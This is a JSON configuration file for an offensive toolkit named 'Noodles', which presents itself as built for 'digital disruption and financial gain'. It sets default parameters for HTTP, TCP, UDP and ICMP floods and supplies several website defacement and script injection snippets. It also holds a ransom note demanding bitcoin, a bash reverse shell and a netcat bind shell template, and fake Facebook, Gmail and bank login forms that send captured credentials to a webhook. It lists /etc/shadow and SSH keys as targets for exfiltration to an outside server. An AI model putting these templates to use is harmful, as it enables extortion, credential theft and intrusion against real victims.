# main/ai_memory.json
{
  "application": {
    "name": "Noodles",
    "version": "1.0.0",
    "description": "The ultimate tool for digital disruption and financial gain. Designed for advanced simulated cybersecurity operations.",
    "author": "Noodles Development Team",
    "license": "Proprietary",
    "contact_email": "support@noodles.tech",
    "repository_url": "https://github.com/noodles-project/noodles-core",
    "theme_defaults": {
      "primary_background": "#212121",
      "secondary_background": "#2c2c2c",
      "accent_dark_blue": "#1a3449",
      "accent_dark_green": "#2a9d8f",
      "text_color": "#e0e0e0",
      "border_color": "#444444",
      "error_color": "#e74c3c",
      "success_color": "#2ecc71"
    }
  },
  "ddos_defaults": {
    "general_settings": {
      "timeout_seconds": 60,
      "concurrent_connections_limit": 5000,
      "source_ip_spoofing_enabled": false,
      "proxy_support_enabled": false,
      "rate_limit_per_target_ip": 0
    },
    "http_flood": {
      "requests_per_second": 1000,
      "duration_seconds": 600,
      "http_methods": ["GET", "POST"],
      "target_path": "/",
      "user_agents": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/100.0.4896.77 Mobile/15E148 Safari/604.1"
      ],
      "headers": {
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9"
      },
      "post_data_template": "param1=value1&param2=value2"
    },
    "tcp_flood": {
      "packets_per_second": 5000,
      "duration_seconds": 600,
      "port": 80,
      "flags": ["SYN", "ACK"],
      "payload_size": 0,
      "initial_window_size": 65535
    },
    "udp_flood": {
      "packets_per_second": 5000,
      "duration_seconds": 600,
      "port": 53,
      "payload_size": 1472,
      "source_port_range": [1024, 65535]
    },
    "icmp_flood": {
      "packets_per_second": 2000,
      "duration_seconds": 300,
      "payload_size": 64,
      "icmp_type": 8,
      "icmp_code": 0
    }
  },
  "defacement_templates": {
    "image_replacement": {
      "description": "Replaces the entire page content with a single image.",
      "default_url": "https://i.ibb.co/XZYXhL3/noodles-defaced.png",
      "html_snippet": "<style>body{margin:0!important;overflow:hidden!important;}img{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999;object-fit:cover;}</style><img src='__IMAGE_URL__'>"
    },
    "text_modification": {
      "description": "Modifies the text content of a specified HTML element.",
      "default_selector": "body",
      "new_text_content": "<h1 style='color:#e0e0e0;text-align:center;font-family:\"Arial Black\", Gadget, sans-serif;font-size:5em;text-shadow:4px 4px 8px #1a3449;'>NOODLES WAS HERE!</h1><p style='color:#2a9d8f;text-align:center;font-family:Arial, sans-serif;font-size:1.5em;'>Your digital presence has been compromised. All systems are now under our control.</p>"
    },
    "html_injection": {
      "description": "Injects custom HTML content into a specified element.",
      "default_selector": "body",
      "html_to_inject": "<div style='position:fixed;top:0;left:0;width:100vw;height:100vh;background-color:rgba(0,0,0,0.9);z-index:10000;display:flex;align-items:center;justify-content:center;'><h1 style='color:#2a9d8f;font-family:\"Courier New\", Courier, monospace;font-size:4em;'>&gt; System Overridden.</h1></div><script>console.log('Noodles Injection Active.');</script>"
    },
    "javascript_injection": {
      "description": "Injects custom JavaScript for client-side manipulation.",
      "default_selector": "head",
      "js_to_inject": "<script>alert('Noodles has taken control of this page!'); document.body.style.backgroundColor = 'black';</script>"
    },
    "css_injection": {
      "description": "Injects custom CSS to alter the page's styling.",
      "default_selector": "head",
      "css_to_inject": "<style>body * { filter: invert(100%); }</style>"
    },
    "remove_elements": {
      "description": "Removes elements matching a specified CSS selector.",
      "default_selector": "header, footer, nav"
    }
  },
  "connection_defaults": {
    "port_scan": {
      "description": "Configuration for scanning open ports.",
      "common_ports": [21, 22, 23, 25, 53, 80, 110, 139, 443, 445, 3306, 3389, 5900, 8080, 8443],
      "timeout_ms": 1000,
      "scan_type": "SYN",
      "full_range_scan_enabled": false
    },
    "banner_grab": {
      "description": "Configuration for grabbing service banners.",
      "default_port": 80,
      "timeout_ms": 2000,
      "service_version_detection_enabled": true
    },
    "os_detection": {
      "description": "Configuration for attempting to detect the target operating system.",
      "enabled": true,
      "intensity_level": "normal"
    },
    "vulnerability_scan": {
      "description": "Configuration for basic vulnerability scanning profiles.",
      "enabled": false,
      "profiles": {
        "basic": ["CVE-2017-0144", "Heartbleed"],
        "web_app": ["SQL Injection", "XSS", "CSRF"]
      },
      "default_profile": "basic"
    }
  },
  "ransomware_conceptual": {
    "note_title": "SYSTEM ENCRYPTED BY NOODLES",
    "note_content": "All critical data on this system has been encrypted with a military-grade algorithm. Your access is revoked. To restore your files and operations, a payment of 0.75 BTC is required. Transfer the sum to: __BTC_ADDRESS__ within 72 hours. Failure to comply will result in permanent data destruction and public exposure of sensitive information.",
    "simulated_encryption_key_format": "AES-256-GCM (simulated)",
    "simulated_btc_address": "bc1qabcdefghijklmnopqrstuvwxyz0123456789abc",
    "simulated_timer_hours": 72,
    "encrypted_file_extension": ".noodles",
    "contact_details": {
      "email": "decrypt@noodles.onion",
      "chat_url": "http://noodleschat.onion/__UNIQUE_ID__"
    },
    "recovery_instructions_url": "http://noodlesinfo.onion/recovery"
  },
  "other_tools_defaults": {
    "payload_generator": {
      "description": "Settings for generating various types of malicious payloads.",
      "types": ["reverse_shell", "bind_shell", "keylogger", "trojan", "worm", "rootkit"],
      "default_os": "linux",
      "default_arch": "x64",
      "reverse_shell_template": "bash -i >& /dev/tcp/__ATTACKER_IP__/__ATTACKER_PORT__ 0>&1",
      "bind_shell_template": "nc -lvp __LISTENER_PORT__ -e /bin/bash",
      "obfuscation_options": {
        "enabled": false,
        "methods": ["base64", "xor", "shikata_ga_nai"],
        "default_method": "base64"
      },
      "output_formats": ["exe", "dll", "sh", "ps1", "py", "elf"]
    },
    "credential_harvester": {
      "description": "Settings for phishing and credential harvesting operations.",
      "default_method": "phishing_template",
      "templates": {
        "facebook": {"title": "Facebook Login", "html": "<form><input type='text' placeholder='Email or Phone'/><input type='password' placeholder='Password'/><button>Log In</button></form>"},
        "gmail": {"title": "Gmail Login", "html": "<form><input type='email' placeholder='Email'/><input type='password' placeholder='Password'/><button>Next</button></form>"},
        "bank": {"title": "Bank Login", "html": "<form><input type='text' placeholder='Username'/><input type='password' placeholder='Password'/><button>Sign In</button></form>"},
        "cloud_storage": {"title": "Cloud Storage Login", "html": "<form><input type='email' placeholder='Email'/><input type='password' placeholder='Password'/><button>Access Files</button></form>"},
        "custom_template_fields": ["title", "html", "redirect_url"]
      },
      "data_exfiltration_method": "webhook",
      "data_exfiltration_endpoint": "https://webhook.site/your-unique-id"
    },
    "data_exfiltration_defaults": {
      "description": "Default settings for extracting data from target systems.",
      "default_protocol": "HTTPS",
      "default_target_server": "exfil.noodles.tech",
      "encrypted_transfer_enabled": true,
      "compression_enabled": true,
      "chunk_size_mb": 10,
      "common_targets": ["/etc/passwd", "/etc/shadow", "/var/www/html/config.php", "~/.ssh/id_rsa"]
    },
    "privilege_escalation_defaults": {
      "description": "Default techniques and configurations for privilege escalation.",
      "linux_techniques": ["sudo_misconfiguration", "kernel_exploits", "cron_jobs", "writable_paths"],
      "windows_techniques": ["service_misconfiguration", "kernel_exploits", "weak_permissions", "unquoted_service_paths"],
      "default_os_check_enabled": true,
      "exploit_db_integration_enabled": true
    },
    "persistence_defaults": {
      "description": "Default methods for maintaining access to a compromised system.",
      "linux_methods": ["cron_jobs", "systemd_units", "init_scripts", "ssh_keys"],
      "windows_methods": ["registry_run_keys", "scheduled_tasks", "services", "WMI"],
      "default_reconnection_interval_seconds": 300,
      "anti_forensics_enabled": true
    }
  }
}